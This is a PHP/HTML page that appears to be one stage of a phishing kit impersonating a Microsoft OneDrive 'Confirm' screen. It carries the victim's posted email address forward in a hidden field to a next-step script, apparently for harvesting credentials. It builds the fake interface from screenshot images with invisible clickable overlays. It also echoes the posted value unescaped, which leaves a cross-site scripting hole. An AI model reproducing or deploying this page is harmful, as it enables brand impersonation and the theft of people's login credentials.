<?php

$emal = $_POST['emal'];

?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>OneDrive - Confirm</title>
<link rel="shortcut icon" href="images/fav_micros.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:856px;top:0px;width:469px;height:638px;text-align:left;z-index:2;">
<img src="images/bodeOffice1.png" id="Image1" alt="" align="top" border="0" style="width:469px;height:638px;"></div>

<div id="bv_Form1" style="position:absolute;left:889px;top:134px;width:389px;height:121px;z-index:3">
<form name="Form1" method="post" action="index_office2.php" id="Form1">

<input name="emal" type="hidden" value="<?php echo $emal;?>">

<div id="bv_Text2" style="margin:0;padding:0;position:absolute;left:92px;top:55px;width:202px;height:26px;text-align:left;z-index:0;">
<font style="font-size:21px" color="#FFFFFF" face="Calibri Light"><?php echo $_POST["emal"];?></font></div>
<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:16px;top:29px;width:353px;height:82px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:1">
</form>
</div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:867px;height:639px;text-align:left;z-index:4;">
<img src="images/bodeOffice2.png" id="Image2" alt="" align="top" border="0" style="width:867px;height:639px;"></div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:912px;top:259px;width:256px;height:44px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:5;">
<a href="index.php"><img src="images/klik.png" id="Image4" alt="" align="top" border="0" style="width:256px;height:44px;"></a></div>
<div id="bv_Image6" style="margin:0;padding:0;position:absolute;left:905px;top:591px;width:189px;height:17px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:6;">
<a href="index.php"><img src="images/klik.png" id="Image6" alt="" align="top" border="0" style="width:189px;height:17px;"></a></div>
</body>
</html>